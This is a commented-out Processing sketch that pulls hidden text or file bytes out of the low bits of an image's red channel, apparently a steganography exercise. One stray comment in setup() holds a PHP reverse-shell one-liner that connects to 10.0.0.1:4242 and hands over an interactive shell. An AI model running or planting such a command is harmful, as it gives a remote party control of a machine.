//import java.util.*;
//int LINEAR = 0;
//int SELECTIVE = 1;
//int FILE = 2;
//int MODE = LINEAR;

//void setup() {
//  size(1200, 600);
  
//  //MODE = LINEAR;
//  //PImage img = loadImage("catWithMessage.png");
//  MODE = FILE;
//  PImage img = loadImage("russ.hidden.png");
  
//  if(MODE == LINEAR || MODE == SELECTIVE){
//    println(decode(img));
//  }
//  else{
//    //println();println();println();println();println();println();println();
//    int ENCODED_BYTES = 125208;//get this from your encode output
//    byte[]nums = getBytes(img,ENCODED_BYTES);
//    saveBytes("Output.png", nums);
//  }
//  image(loadImage("Output.png"),0,0);
//  //php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
//}

//byte[] getBytes(PImage img, int total) {
//  byte[] nums = new byte[total];
//  img.loadPixels();
//  for (int i=0; i<total*4; i++) {
//    if (i%4==0) {
//      nums[i/4] = 0;
//    }
//    nums[i/4] = (byte)(nums[i/4]<<2);
//    byte red = (byte)((int)(red(img.pixels[i]))&3);
//    nums[i/4]+=red;
//    //print((nums[i/4]&3)+", ");
//  }
  
//  //for (int i=0; i<total; i++) {
//  //  println(nums[i]);
//  //}
  
//  return nums;
//}

//String decode(PImage img) {
//  img.loadPixels();
//  String end = "";
//  String bit = "";
//  for (int i=0; i<img.pixels.length; i++) {
//    int red = (int)(red(img.pixels[i]))&3;
//    if (red>=2) {
//      red-=2;
//      bit+=1;
//    }
//    else {bit+=0;}
//    if (red==1) {
//      red-=1;
//      bit+=1;
//    }
//    else {bit+=0;}
    
//    if (bit.length()==8) {
//      if (bit.equals("11111111")) {
//        i+=img.pixels.length; 
//      }
//      else {
//        end+= (char)(Byte.parseByte(bit,2));
//        bit = "";
//      }
//    }
//  }
  
  
  
  
//  return end;
//}
